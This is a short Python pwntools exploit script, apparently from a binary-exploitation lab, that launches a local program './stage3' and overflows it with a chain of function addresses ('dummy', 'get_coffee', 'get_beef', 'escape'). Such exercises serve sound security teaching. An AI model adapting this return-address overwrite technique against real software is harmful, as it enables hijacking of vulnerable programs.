import sys
from pwn import process, context, p64, ELF
import time
import re


target = './stage3'
context.binary = ELF(target, checksec=False)


p = process(target)
io = p

output = io.recv()
print(output.decode('ascii'))

############### YOUR INPUT HERE ####################
dummy = context.binary.symbols['dummy']
get_beef = context.binary.symbols['get_beef']
get_coffee = context.binary.symbols['get_coffee']
escape = context.binary.symbols['escape']
input = p64(dummy)
for i in range(100):
    input += p64(dummy)
input += p64(get_coffee)
input += p64(get_beef)
input += p64(escape)
####################################################

# Send input to program
io.sendline(input)

# Get output
output = io.recv()
print(output.decode('ascii'))







